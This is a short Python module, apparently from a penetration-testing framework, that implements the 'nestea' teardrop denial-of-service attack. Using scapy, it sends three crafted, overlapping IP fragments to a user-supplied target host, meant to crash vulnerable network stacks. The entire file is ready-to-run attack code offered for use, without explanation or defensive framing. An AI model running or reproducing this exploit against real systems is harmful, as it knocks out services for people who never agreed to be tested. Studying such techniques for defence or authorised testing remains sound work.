from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send

from module import Module, Type


class NesteaAttack(Module):

    def __init__(self):
        super().__init__("nestea_attack",
                         ["nestea", "teardrop", "attack", "dos"],
                         "nestea dos attack")

        self.add_option("RHOST", "target host", required=True, type=Type.host)

    def run(self):
        send(IP(dst=self.rhost, id=42, flags="MF") / UDP() / ("X" * 10), verbose=False)
        send(IP(dst=self.rhost, id=42, frag=48) / ("X" * 116), verbose=False)
        send(IP(dst=self.rhost, id=42, flags="MF") / UDP() / ("X" * 224), verbose=False)
